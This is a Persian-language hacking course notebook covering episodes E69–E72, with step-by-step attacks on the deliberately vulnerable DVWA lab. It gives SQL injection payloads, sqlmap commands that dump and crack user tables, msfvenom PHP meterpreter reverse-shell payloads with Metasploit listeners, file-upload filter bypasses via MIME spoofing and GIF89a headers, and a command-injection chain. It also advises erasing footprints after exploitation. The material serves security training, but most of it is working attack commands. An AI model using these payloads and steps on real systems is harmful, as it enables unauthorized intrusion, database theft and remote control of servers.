---
Episode: E69 to E72
Date: 2024-07-24
Is Finished?: true
Practice Primary: true
Practice Secondary: 
Time: 32:00
tags:
  - CyberSecurity
  - hacking
Category: Cyber Security
banner: 
Home: "[[Table of Content - Hacking & Security]]"
Pervious Episode: "[[E64 to E68 - (Web Hacking - Part 1)]]"
Next Episode: "[[E73 to E76- (Android Hacking)]]"
---
-------
#CyberSecurity #hacking 
## E69 to E72 - (Web Hacking - Part 2)
- [SQL Injection Vulnerability 1 - E69](#SQL%20Injection%20Vulnerability%201%20-%20E69)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [What is SQL Injection Attack?](#What%20is%20SQL%20Injection%20Attack?)
		- [SQL Injection Attack Usages?](#SQL%20Injection%20Attack%20Usages?)
		- [SQLMAP](#SQLMAP)
			- [Automate SQL Injection Tools](#Automate%20SQL%20Injection%20Tools)
			- [`sqlmap` Command Guide](#%60sqlmap%60%20Command%20Guide)
	- [Practical Demo](#Practical%20Demo)
		- [DVWA SQL Injection - Low Difficulty Instruction](#DVWA%20SQL%20Injection%20-%20Low%20Difficulty%20Instruction)
- [SQL Injection Vulnerability 2 - E70](#SQL%20Injection%20Vulnerability%202%20-%20E70)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [Basics & Concepts](#Basics%20&%20Concepts)
		- [DVWA SQL Injection Instruction](#DVWA%20SQL%20Injection%20Instruction)
	- [Practical Demo](#Practical%20Demo)
		- [Medium Difficulty](#Medium%20Difficulty)
		- [High Difficulty](#High%20Difficulty)
- [File Upload Vulnerability - E71](#File%20Upload%20Vulnerability%20-%20E71)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [What is File Upload Vulnerability?](#What%20is%20File%20Upload%20Vulnerability?)
		- [Low Difficultly Instruction](#Low%20Difficultly%20Instruction)
		- [Medium Difficultly Instruction](#Medium%20Difficultly%20Instruction)
	- [Practical Demo](#Practical%20Demo)
		- [DVWA File Upload - Low Difficulty](#DVWA%20File%20Upload%20-%20Low%20Difficulty)
		- [DVWA File Upload - Medium Difficulty](#DVWA%20File%20Upload%20-%20Medium%20Difficulty)
- [Chaining Multiple Vulnerabilities in DVWA(File Upload, Command Injection) - E72](#Chaining%20Multiple%20Vulnerabilities%20in%20DVWA(File%20Upload,%20Command%20Injection)%20-%20E72)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [Chaining Multiple Vulnerabilities](#Chaining%20Multiple%20Vulnerabilities)
		- [Logic of this Challenge](#Logic%20of%20this%20Challenge)
		- [Instruction Steps](#Instruction%20Steps)
	- [Practical Demo](#Practical%20Demo)
******
### SQL Injection Vulnerability 1 - E69
#### Definition & Instruction
##### What is SQL Injection Attack?  
- نوعی از حمله میباشد که بوسیله آن Attacker کد های مخرب SQL را به قسمت SQL وب سرور(پایگاه داده) تزریق میکند و با استفاده از این روش سعی به گرفتن دسترسی به دیتابیس درون وب سرور تارگت میکند.
- دیتابیس یک وب سرور یکی از مهمترین اجزا آن است که تمام اطالعات حساس از جمله اطلاعات سرور، اطلاعات کاربران، اطلاعات مالی و ... در آن ذخیره میشود.
- برای پیاده سازی SQL Injection، از فیلد های درون وب اپلیکیشن که به دیتابیس متصل هستند استفاده میکنیم. فیلد هایی مانند Search box, Login Forms , ... برای کارکرد خود باید به دیتابیس متصل باشند بنابراین میتوانیم از این فیلد ها در حمله SQL Injection استفاده کنیم.
	- ![[Pasted image 20240723203829.png]]
##### SQL Injection Attack Usages?
1. به Attacker اجازه Bypass کردن Authentication را میدهد.
2. به Attacker اجازه Access, Modify و Delete داده های حساس را میدهد.
3. به Attacker اجازه اجرای کامند Execute Command بر روی وب سرور را میدهد.
4. به Attacker اجازه ساخت اکانت جدید با دسترسی کامل High Full Privilege را میدهد.
5. *غیره ....*
	1. ![[Pasted image 20240723204254.png]]
##### SQLMAP 
###### Automate SQL Injection Tools
بطور معمول با تزریق کامند های SQL میتوانیم داده ها را از وب سرور واکشی کنیم اما اینکار نیازمند دانش قوی در زمینه برنامه نویسی و زبان SQL میباشد. 
حال با استفاده از ابزار های Automation SQL Injection میتوانیم بصورت اتوماتیک تزریق SQL را انجام دهیم. 
از بهترین این ابزار ها میتوانیم به `Havij` در GUI و `sqlmap` در CLI اشاره کنیم که در اینجا میخواهیم `sqlmap` را توضیح دهیم.
###### `sqlmap` Command Guide
*برای استفاده از این ابزار* >>
1. ابتدا باید Burpsuite را روش و سپس Intercept On را کنیم، به صفحه DVWA SQL Injection برمیگردیم و صفحه را Refresh میکنیم تا درخواست کپچر شود.
2. سپس درخواست کپچر شده را در یک فایل متنی txt ذخیره میکنیم. `req.txt`
3. حال میتوانیم `sqlmap` را به شکل زیر اجرا کنیم:
	1. ![[Pasted image 20240723205433.png]]
- `sqlmap -h`
	- ![[Pasted image 20240723211200.png]]
```sh
sqlmap -r req.txt --dbs
-r => Read txt file contains Captured HTTP Request
--dbs => List all databases - Database Enumeration
```
	![[Pasted image 20240723205425.png]]
- با اجرای خط بالا تمام ابزار سوال هایی برای پیادهسازی حملات خود میپرسد که پس از جواب دادن به آن، دیتابیس های موجود درون وب سرور لیست میشوند. 
- برای بدست آوردن اطلاعات بیشتر مانند `جداول درون دیتابیس` نیز از کامند زیر استفاده میکنیم:
```sh
sqlmap -r req.txt -D dvwa --tables
-D => Specify Database
--tables => Extract tables from dvwa database
```
	![[Pasted image 20240723205859.png]]
- پس از واکشی جدداول درون دیتابی، برای بدست آوردن `ستون های جداول` نیز از کامند زیر استفاده میکنیم:
```sh
sqlmap -r req.txt -D dvwa -T users --columns
-T => Specify Table 
--columns => Extract 'users' table Columns
```
	![[Pasted image 20240723210129.png]]
- همچنین با استفاده از کامند زیر هم میتوانیم دیتابیس را بطور کلی `dump` کنیم، در واقع با این دستور تمام محتویات درون تمام جداول را میتوانیم مشاهده کنیم:
```sh
sqlmap -r req.txt -D dvwa -T users --dump-all
```
	![[Pasted image 20240723210206.png]]
- پس از اجرای خط بالا یعنی Dump کردن مقادیر دیتابیس، اگر ابزار درون دیتابیس به مقادیر hash شده برسد سوالی میپرسد که میخواهید آنها را کرک کنید و سپس بصورت کرک شده مشاهده کنید؟ اگر جواب `Y` بدهید باید Path یک Wordlist را نیز وارد کنیم تا با استفاده از آن مقادیر هش شده کرک و نمایش داده شوند:
	- ![[Pasted image 20240725225125.png]]
#### Practical Demo
##### DVWA SQL Injection - Low Difficulty Instruction
0. *Pre-Requires*
	1. Set Security Level on Low
	2. goto `DVWA => SQL Injection`
1. *Manually Inject SQL Commands* 
	1. هنگامیکه به صفحه آزمایشگاه میرویم فیلدی را مشاهده میکنیم که به دیتابیس هم متصل است. 
	2. در این فیلد ID هر یوزری را که وارد کنیم تمام اطلاعات آن واکشی میشود.
		1. ![[Pasted image 20240723210759.png]]
	3. کافیست در این فیلد عبارت زیر را تزریق کنیم تا داده های درون دیتابیس واکشی شوند >>
	4. `' OR 1=1 #`
		1. ![[Pasted image 20240723210558.png]]
	5. با اجرای کامند، شرط درون فیلد True میشود و تمام داده های درون دیتابیس واکشی میشود، در واقع در منطق OR اگر یک طرف شرط True باشد، کل شرط نیز True میشود در نتیجه میتوان با اضافه کردن یک طرف True کل شرط را True کرد.
		1. ![[Pasted image 20240723210625.png]]
2. *Capture Request with Burpsuite*
	1. Intercept On
	2. Set Proxy On in Foxy Proxy
	3. Submit an ID and request captured in Burp
		1. ![[Pasted image 20240723210919.png]]
	4. `Select All Request Content => Right-Click => Copy to file`
		1. ![[Pasted image 20240723211008.png]]
	5. save as `req.txt` 
3. *Automated SQL Injection with `sqlmap`*
	1. `sqlmap -r req.txt --dbs`
		1. ![[Pasted image 20240723211308.png]]
	2. در این وب سرور دو دیتابیس بنام های `dvwa` و `information_schema` وجود دارد، حال میتوانیم جداول `dvwa` را واکشی کنیم:
		1. ![[Pasted image 20240723211350.png]]
	3. `sqlmap -r req.txt -D dvwa --tables`
		1. ![[Pasted image 20240723211523.png]]
	4. در دیتابیس `dvwa` دو جدول بنام های `users` و `guestbook` وجود دارد، حال باید ستون های جدول `users` را واکشی کنیم.
		1. ![[Pasted image 20240723211553.png]]
	5. `sqlmap -r req.txt -D dvwa -T users --columns`
		1. ![[Pasted image 20240723211652.png]]
	6. با اجرای کامند تمامی ستون های جدول users به همراه Type هر ستون واکشی میشوند، در آخر هم میتوانیم با استفاده از کامند زیر تمام داده های درون جدول `users` را واکشی کنیم.
		1. ![[Pasted image 20240723211759.png]]
	7. `sqlmap -r req.txt -D dvwa -T users --dump-all`
		1. ![[Pasted image 20240723211939.png]]
	9. اگر در دیتابیس hash وجود داشته باشد، ابزار سوالی برای کرک این هش ها میپرسد. 
		1. ![[Pasted image 20240723212205.png]]
	10. مثلا اگر فیلد داده های Password اکانت ها بصورت hash شده ذخیره شده باشد، ابزار میتواند بصورت خودکار مقادیر هش شده را کرک کند و مقدار صحیح را نمایش دهد.
		1. ![[Pasted image 20240723212255.png]]
	11. همانطور که در تصویر زیر مشاهده کردیم تمام داده های درون جدول `users` با اجرای کامند بالا واکشی و سپس نمایش داده میشوند.
		1. ![[Pasted image 20240723212445.png]]
4. SQL Injection & Cracking Done
	1. با اجرای کامند `dump-all--` تمام داده های درون جدول یوزر لیست میشوند و درواقع توانستیم با موفقیت تزریق SQL را بصورت دستی و اتوماتیک انجام دهیم:
		1. ![[Pasted image 20240723212403.png]]
```sh
sqlmap -r req.txt --dbs #1. Extract Databses in Server
sqlmap -r req.txt -D dvwa --tables #2. Extract Tables in DVWA Databse
sqlmap -r req.txt -D dvwa -T users --columns #3. Extract Columns in users Table
sqlmap -r req.txt -D dvwa -T users --dump-all #4. Dumping all Records from dvwa Database users Table
"sqlmap Asking for store hashes in temporary file" => Y?N #Press Y
"sql map asking for Cacking Hashes =>" Y?N #Press Y
"Enter a Wordlist Path:"
```
### SQL Injection Vulnerability 2 - E70

#### Definition & Instruction
##### Basics & Concepts
- در این جلسه میخواهیم چالش SQL Injection را در لول High انجام دهیم. 
- برای اینکار میتوانیم تزریق کامند را بصورت manual انجام دهیم و هم میتوانیم Automated SQL Injection را بوسیله `sqlmap` انجام دهیم.
- در این لول دشوار SQL Injection از تکنیک `()mysql_real_escape_string` استفاده میشود که در نتیجه نمیتوان در فیلد Passed شده از `'` Quote استفاده کنیم.
- البته در این مرحله نیازی به `'` Quote نداریم و با استفاده از `UNION` میتوانیم داده های جدول را بصورت دستی واکشی کنیم.
##### DVWA SQL Injection Instruction
- **Medium Difficulty**
	1. هنگامیکه به این صفحه میرویم میتوانیم یک User ID را Select کنیم تا داده های درون آن رکورد واکشی شوند. در واقع فیلدی برای ورود داده وجود ندارد.
		1. ![[Pasted image 20240724163347.png]]
	2. بنابراین باید تزریق کد ها را در Inspect صفحه در فیلد مناسب آن انجام دهیم.
		1. ![[Pasted image 20240724163002.png]]
		2. ![[Pasted image 20240724163937.png]]
	3. برای این مرحله SQL Payload را باید در تگ `<option value="SQLPAYLOAD">` انجام دهیم. همچنین Payload مورد استفاده را در خط زیر میتوان مشاهده کردکه همان Payload مرحله ساده است:
	4. `<option value="1 OR 1=1#">1</option>`
		1. ![[Pasted image 20240725231914.png]]
	5. پس از تزریق و جایگذاری کد SQL بجای عبارت `1` فیلد drop down، کافیست بر روی Submit کلیک کنیم تا بجای واکشی رکورد 1، کد Payload ما اجرا شود و تمام رکورد های دیتابی واکشی شوند.
- **High Difficulty**
	1. در مرحله دشوار این مرحله تزریق SQL Payload باید در صفحه ای دیگر انجام شود. در این مرحله هم میتوانیم از همان Payload که در مرحله Low استفاده کردیم استفاده کنیم.
		1. ![[Pasted image 20240724164401.png]]
	2. در واقع هنگامیکه وارد صفحه میشویم، لینکی را بنام `Click here to change id` مشاهده میکنیم که با کلیک بر روی آن وارد صفحه جدید میشویم که در آن صفحه فیلدی ورودی را میتوانیم مشاهده کنیم:
		1. ![[Pasted image 20240724164749.png]]
	3. تنها تفاوتی که در این مرحله وجود دارد این است که Payload مورد استفاده در این مرحله متفاوت با مراحل قبلی است.
	4. با تزریق SQL Payload زیر در این فیلد تمام دکورد های این جدول را واکشی کنیم:
	5. `1 UNION SELECT user,passwod FROM users #`
		1. ![[Pasted image 20240724164910.png]]
	6. البته با استفاده از Payload ساده زیر هم میتوانیم رکورد های درون جدول را واکشی کنیم.
	7. `' OR 1=1 #`
		1. ![[Pasted image 20240725232654.png]]
#### Practical Demo
##### Medium Difficulty
0. Set Security level on `medium` and goto `DVWA => SQL Injection `
1. goto `Inspect` in SQL Injection page and then Select `Drop Down Menu` to Select drop down Codes
	1. ![[Pasted image 20240724163548.png]]
2. Now `Inject` Below `SQL Payload` to `<option value="SQLPAYLOAD">`
	1. `<option value="1 OR 1=1#">1</option>`
		1. ![[Pasted image 20240724163756.png]]
3. Click on `Submit` to Get all records in Table
	1. ![[Pasted image 20240724163835.png]]
##### High Difficulty
0. Set Security level on `High` and then goto `DVWA => SQL Injection `
1. Click on `Click here to change id` to Open new tab.
2. Now in `User ID` Field Inject Below SQL Payload
	1. `1 UNION SELECT user,passwod FROM users #`
		1. ![[Pasted image 20240724165125.png]]
	2. Or Inject below SQL Payload =>
	3. `' OR 1=1 #`
3. Now click on `Submit` to Extract all records in table
	1. ![[Pasted image 20240724165112.png]]
### File Upload Vulnerability - E71
#### Definition & Instruction
##### What is File Upload Vulnerability?
- نوعی از آسیب پذیری درون وب اپلیکیشن است که به Attacker اجازه آپلود فایل مخرب را در سرور آن وب اپلیکیشن را میدهد.
- حال این فایل میتواند شامل کد های مخربی باشد که با اجرا بر روی وب سرور دسترسی غیر مجاز به داده های حساس را برای Attacker فراهم کند.
- در واقع بوسیله این آسیب پذیری میتوانیم کد های مخرب، انواع Reverse Shell و یا انواع حمله ها را بر روی ماشین تارگت پیاده سازی کنیم.
- این آسیب پذیری زمانی رخ میدهد که فیلدی که برای آپلود استفاده میشود درست Validate(تایید) و Sanitize(فیلتر و پاکسازی) نمیشود در نتیجه میتوان هر فایلی را بوسیله این فیلد در سرور آپلود کرد.
	![[Pasted image 20240724170221.png]]
- در فرآیند Sanitizing فایلی که قرار است آپلود شود از لحاظ هایی که برنامه نویس مشخص میکند بررسی میشود تا صحت فایل تایید شود. 
- مثلا پسوند Extension فایل بررسی میشود و اگر جز پسوند های مجاز بود اجازه آپلود آن صادر میشود، و یا مثلا Size یک فایل بررسی میشود که اگر از 2000 کلیوبایت بیشتر بود اجازه آپلود نداشته باشد.
##### Low Difficultly Instruction
1. Create `msfvenom` payload 
	1. در مرحله اول باید Payload با پسوند PHP ایجاد کنیم که با آپلود آن بتوانیم به وب سرور دسترسی بگیریم. 
```sh
msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw > exploit.php
```
	![[Pasted image 20240724170644.png]]
2. Now run `metasploit` and Start `Multi-Handler` to Listen `PHP Reverse Sessions`
	1. حال باید یک Listener را برای این Payload اجرا کنیم تا در صورت گرفتن دسترسی بتوانیم آنرا مدیریت کنیم.
```sh
sudo msfconsole
msf6> use exploit/multi/handler 
msf6> set payload php/meterpreter/reverse_tcp
msf6> set LHOST 127.0.0.1
msf6> exploit
```
	![[Pasted image 20240724171009.png]]
3. Now Upload `exploit.php` and then Open `exploit.php` in the Browser to Give Meterpreter Shell Access in `msfconsole`
	1. در این مرحله هیچ فیلتری بر روی فایل صورت نمیگیرد در نتیجه براحتی میتوانیم فایل را در سرور آپلود کنیم.
		1. ![[Pasted image 20240724171414.png]]
	2. کافیست فایل را در مرورگر باز کنیم تا بتوانیم دسترسی آنرا در کنسول `metasploit` مشاهده کنیم.
		1. ![[Pasted image 20240724171410.png]]
##### Medium Difficultly Instruction
0. *DVWA File Upload - Medium Level Logic*
	1. تفاوتی که در مرحله متوسط دارد این است که فایلی که قرار است آپلود شود ابتدا Sanitize میشود که فقط پسوند فایل های عکس یعنی `jpg, png, jpeg` باشد. 
		1. ![[Pasted image 20240724183225.png]]
	2. این Sanitizing را در یک if که برای فیلد آپلود در نظر گرفته شده است میتوان مشاهده کرد:
		1. ![[Pasted image 20240724183236.png]]
	3. در واقع در این مرحله فقط Type فایل بررسی میشود که حتما باید `imag/jpeg` باشد، در حالیکه در مرحله دشوار علاوه بر پسوند فایل، Type فایل و کد مخصوص image هم `;GIF98a` بررسی میشود.
	   بنابراین باید با استفاده از تکنیک پسوند PHP Payload را به یکی از پسوند های مجاز تغییر دهیم. اینکار را میتوانیم بوسیله `Burpsuite => Repeater Module` انجام دهیم.
1. Create `msfvenom` payload
	1. ![[Pasted image 20240724182627.png]]
```sh
msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw > exploit.php
```
2. Now run `metasploit` and Start `Multi-Handler` to Listen `PHP Reverse Sessions`
	1. ![[Pasted image 20240724182936.png]]
```sh
sudo msfconsole
msf6> use exploit/multi/handler
msf6> set payload php/meterpreter/reverse_tcp
msf6> set LHOST 127.0.0.1
msf6> run
```
3. *Fire-UP Burpsuite and goto File Upload page*
	1. Browse and Select `exploit.php` then Upload it, same as Low level
	2. Then `Capture` request in `Burpsuite` and Send it to `Repeater module(CTRL+R)`
	3. Now change `application/x-php` to `image/jpeg` to Bypass Sanitizing. Send Request with modify content.
		1. ![[Pasted image 20240724183749.png]]
	4. *Slide*
		1. ![[Pasted image 20240724183746.png]]
4. *Open `Exploit.php` file in Browser*
	5. File uploaded successfully, now Open it in Browser to give Meterpreter Access in msfconsole.
		1. ![[Pasted image 20240724183957.png]]
#### Practical Demo
##### DVWA File Upload - Low Difficulty
0. *Start Multi-Handler Listening*
	1. `use exploit/multi/handler`
	2. `set payload php/meterpreter/reverse_tcp`
		1. ![[Pasted image 20240724174031.png]]
	3. `set LHOST 127.0.0.1`
	4. `exploit`
		1. ![[Pasted image 20240724174211.png]]
	5. Now Listener start and wait for reverse PHP Session.
```sh
sudo msfconsole
msf6> search handler
msf6> use exploit/multi/handler
msf6> set payload php/meterpreter/reverse_tcp
msf6> set LHOST 127.0.0.1
msf6> run
```
1. *Create payload with `msfvenom`*
	1. `msfvenom -l payloads | grep php`  List all payloads for PHP
	2. `msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw > exploit.php`
		1. ![[Pasted image 20240724174835.png]]
	3. Now payload successfully created and we can use it
		1. ![[Pasted image 20240724174908.png]]
```sh
msfvenom -l payloads | grep php
msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw > exploit.php
```
2. *Goto `DVWA => File Upload` *
	1. Click on `Browse` and select `Exploit.php` 
		1. ![[Pasted image 20240724175259.png]]
	2. Now click on `Upload` and Payload upload to server
		1. ![[Pasted image 20240724175357.png]]
	3. Copy uploaded payload URL, then open it in Browser
		1. ![[Pasted image 20240724175520.png]]
3. *Go back to `msfconsole`*
	1. by upload and run `Exploit.php` in DVWA Server, now we get `Meterpreter Access` to this Server
		1. ![[Pasted image 20240724175655.png]]
	2. We can run any Meterpreter commands in DVWA Server such as:
		1. `meterpreter> ls`
			1. ![[Pasted image 20240724175809.png]]
		2. `meterpreter> getuid`
			1. ![[Pasted image 20240724175835.png]]
4. *Post Exploitation Phase*
	1. in First Step we should `remove exploit.php` in server, Actually we should `Cleaning all Footprints` on server.
		1. ![[Pasted image 20240724180022.png]]
	2. `Meterpreter > exit` Shutting down Meterpreter.
		1. ![[Pasted image 20240724182128.png]]
	3. حال اگر دوباره Listener را Run کنیم بدلیل اینکه فایل Payload را از  سرور حذف کردیم، Listener فقط به حالت شنود میرود و Session نیست که به آن متصل شود.
5. Hacking done.
##### DVWA File Upload - Medium Difficulty
0. Set Security level on medium and goto `DVWA => File Upload `
1. Click on `Browse`, Select `Exploit.php` and `Upload` it.
	1. ![[Pasted image 20240724184222.png]]
2. *Check page `View Source`*
	1. در کد های صفحه میتوانیم مشاهده کنیم که فقط اجازه آپلود فایل های `image/jpeg` و `image/png` در این فیلد هست.
		1. ![[Pasted image 20240724184339.png]]
	2. هنگامیکه آپلود را انجام دهیم با حاطایی مواجه میشویم که میگوید فایل شما عکس نیست.
		1. ![[Pasted image 20240724184427.png]]
3. *Fire-UP Burpsuite*
	1. Start Burp on Temporary Project, goto `Proxy tab` and set `Intercept ON`, goto `Firefox => Foxy Proxy` and set Proxy on Burp Proxy.
	2. `DVWA => File Upload => Browse => Select Exploit.php => Upload` Capturing this request on Burpsuite, You can see `application/x-php` 
		1. ![[Pasted image 20240724185004.png]]
	3. Now change `application/x-php` to `image/jpeg` and then `Forward` request
		1. ![[Pasted image 20240724185114.png]]
	4. Back to Browser and you can see `Exploit.php` Uploaded Successfully on DVWA Server.
		1. ![[Pasted image 20240724185218.png]]
4. *Give Meterpreter accessing*
	1. Open `exploit.php` in Browser => http://127.0.0.1:42001/../../hackable/uploads/exploit.php
	3. Back to `msfconsole` and you give Meterpreter access. proof-of-concept is executed `ls`
		1. ![[Pasted image 20240724185531.png]]
5. Hacking done.
### Chaining Multiple Vulnerabilities in DVWA(File Upload, Command Injection) - E72
#### Definition & Instruction
##### Chaining Multiple Vulnerabilities
میتوانیم از چندین آسیب پذیری با یکدیگر استفاده کنیم. مثلا در این مرحله میخواهیم از دو آسیب پذیریFile Upload در لول High و Command Injection در لول High با یکدیگر استفاده کنیم.
در واقع میخواهیم یک Payload PHP برای Meterpreter Reverse TCP ایجاد و سپس در ماشین سرور آپلود کنیم. در این مرحله علاوه بر Type فایل باید پسوند فایل را هم به `jpeg` تغییر دهیم در نتیجه باید با استفاده از تزریق کامند پس از آپلود فایل نام آنرا به پسوند `php` تغییر دهیم.
##### Logic of this Challenge
0. *DVWA File Upload High Difficulty `Logic`*
	1. درلول دشوار Upload File میتوانیم مشاهده کنیم که Type, Size و Extension فایل بررسی میشود که حتما فایلی که میخواهد آپلود شود مورد نظر تصویر jpeg باشد.
		![[Pasted image 20240724190417.png]]
	2. در اول Header هر فایل  یک String HEX وجود دارد که مشخص کننده Type فایل است. مثلا رشته `;GIF89a` نشان دهنده این است که فایل مورد نظر `jpeg` است.
	3. بنابراین اگر در Header فایل این متن را وارد کنیم و پسوند فایل را نیز به `jpeg` تغییر دهیم میتوانیم *Sanitizing* را *Bypass* کنیم.
	4. *بنابراین باید >>*
		1. نام فایل را به `exploit.php.jpeg` تغییر دهیم، 
		2. همچنین در اول فایل Header فایل نیز عبارت `;GIF89a` را وارد کنیم. 
		3. پس از انجام اینکار ها میتوانیم این فایل `php` را بجای `jpeg` را آپلود کنیم.
			1. ![[Pasted image 20240724191019.png]]
1. *DVWA Command Injection High Difficulty `Logic`* 
	1. پس از آپلود فایل باید به قسمت `DVWA => Command Injection` برویم تا در یک حمله Command Injection فایل `exploit.php.jpeg` را مجددا به `exploit.php` تغییر دهیم تا بتوانیم فایل را در سرور DVWA اجرا کنیم. 
		1. ![[Pasted image 20240724192050.png]]
	2. در سطح دشوار با اشتباه تایپی که در Sanitizing در هنگام بررسی ` |` وجود داشت، با استفاده از Typo بدون فاصله تا کامند، میتوانستیم کامند مورد نظر را به سرور تزریق کنیم.
	3. بنابراین برای اینکار کامند زیر را پس از آپلود فایل در سرور تارگت،به سرور تزریق میکنیم >>
		1. `|mv "/usr/share/dvwa/hackable/uploads/exploit.php.jpeg" "/usr/share/dvwa/hackable/uploads/exploit.php"`
			1. ![[Pasted image 20240724192108.png]]
##### Instruction Steps
0. Set Security level on High and goto `DVWA => SQL Injection`
1. Create `msfvenom` payload
```sh
msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw > exploit.php
```
	![[Pasted image 20240724190133.png]]
2. Start Multi-Handler to Listening PHP Reverse Shells
```sh
ifconfig #Copy local ip tp st in LHOST on Payload
sudo msfconsole
msf6> search handler
msf6> use exploit/multi/handler
msf6> set payload php/meterpreter/reverse_tcp
msf6> set LHOST 192.168.18.121 #or 127.0.0.1
msf6> exploit -j -z
```
	![[Pasted image 20240724190247.png]]
3. *Change type of Payload from application/php to image/jpeg*
	1. Rename PHP Payload to `exploit.php.jpeg` and add `GIF89a;` to Header of this file
		1. ![[Pasted image 20240724191246.png]]
```sh
mv exploit.php exploit.php.jpeg
sudo nano exploit.php.jpeg
"Add below value in file header" => GIF89a;
```
4. *`DVWA => Command Injection` Inject Command to rename `exploit.php.jpeg`*
	1. Now we should Rename `exploit.php.jpeg` to `exploit.php` in DVWA Server in Command Injection Attack. 
	2. Command should be inject in `Enter ping ip address` Field
		1. ![[Pasted image 20240724195413.png]]
	3. in `DVWA Command Injection High Difficulty` Should inject Command without Space after Typo char.
		1. `| mv` Low, Medium Difficulty
		2. `|mv` High Difficulty
```sh
|mv "/usr/share/dvwa/hackable/uploads/exploit.php.jpeg" "/usr/share/dvwa/hackable/uploads/exploit.php"
```
	![[Pasted image 20240724192118.png]]
5. Now Open `exploit.php` in Browser to Give Meterpreter Access on `msfconsole`
	1. http://127.0.0.1:42001/hackable/uploads/exploit.php
		1. ![[Pasted image 20240724195503.png]]
	2. After file open we can give Meterpreter accessing and run Meterpreter commands
		1. `meterpreter > ls`
		2. `meterpreter > getuid`
			1. ![[Pasted image 20240726234424.png]]
6. Hacking done.
#### Practical Demo
0. Set Security level on High, Then goto `DVWA => File Upload`
1. Create PHP Reverse Shell Payload with `msfvenom`
```sh
msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw > exploit.php
```
	![[Pasted image 20240724200244.png]]
2. *Start `msfconsole` Listener for PHP Reverse Shell*
	1. در این مرحله باید ابتدا آیپی لوکال ماشین را کپی کنیم تا آنرا در LHOST جایگذاری کنیم. 
	2. تنها در صورتی میتوانیم از 127.0.0.1 استفاده کنیم که DVWA در ماشین Kali نصب شده باشد.
```sh
ifconfig #Copy local ip tp st in LHOST on Payload
sudo msfconsole
msf6> use exploit/multi/handler
msf6> set payload php/meterpreter/reverse_tcp
msf6> set LHOST 192.168.18.121
msf6> exploit -j -z
```
	![[Pasted image 20240724201903.png]]
3. Try to upload `exploit.php` and you see doesn't allow for this operation.
4. Now rename PHP Payload to `exploit.php.jpeg`
```sh
cp exploit.php exploit.php.jpeg
```
	![[Pasted image 20240724200502.png]]
4. Upload `exploit.php.jpeg` and you see we cant upload this file yet because File Type also checked in Page Source and this file is not a image(jpeg/png) file.
	1. ![[Pasted image 20240724200644.png]]
5. *Change Type of `exploit.php.jpeg` from `php` to `Image`*
	1. `sudo nano exploit.php.jpeg`
	2. Add below line to Header of File
	3. `GIF89a;`
		1. ![[Pasted image 20240724200827.png]]
	4. این مرحله را میتوان قبل از تغییر پسوند فایل هم انجام داد.
```sh
sudo nano exploit.php.jpeg
"Add below value in file header" => GIF89a;
```
6. Now Upload `exploit.php.jpeg` again, In this Try we can `Upload file Successfully`
	1. ![[Pasted image 20240724200948.png]]
7. *But now we should rename `exploit.php.jpeg` to `exploit.php` to can Executed Payload in DVWA Server. for this Operation =>*
	1. در این لحظه میتوانیم فایل `exploit.php.jpeg` را در مرورگر باز کنیم اما ما نیاز داریم که فایل `exploit.php` را در سرور اجرا کنیم تا Payload ما با موفقیت اجرا شود و بتوانیم دسترسی Meterpreter را در کنسول `msfconsole` بگیریم.
		1. ![[Pasted image 20240724201443.png]]
	2. `DVWA => Command Injection ` Inject below command to *Enter IP Address Field*
		1. `|mv "/usr/share/dvwa/hackable/uploads/exploit.php.jpeg" "/usr/share/dvwa/hackable/uploads/exploit.php"`
			1. ![[Pasted image 20240724202117.png]]
	3. Now inject below command to see List of files in DVWA server
		1. `|ls /usr/share/dvwa/hackable/uploads`
			1. ![[Pasted image 20240724202225.png]]
			2. ![[Pasted image 20240724202233.png]]
```sh
|mv "/usr/share/dvwa/hackable/uploads/exploit.php.jpeg" "/usr/share/dvwa/hackable/uploads/exploit.php"
|ls /usr/share/dvwa/hackable/uploads
```
8. *Now Open http://127.0.0.1:42001/hackable/uploads/exploit.php in Browser =>*
	1. Back to `msfconsole` and run `sessions` to see Meterpreter Shell from DVWA Server
		1. ![[Pasted image 20240724202457.png]]
	2. Connect to Session using `msf6> sessions -i 1`
```sh
msf6> sessions
"Now meterpreter Session established and see in here"
msf6> sessions -i 1 #Connect to Session
```
9. Hacking done.
### !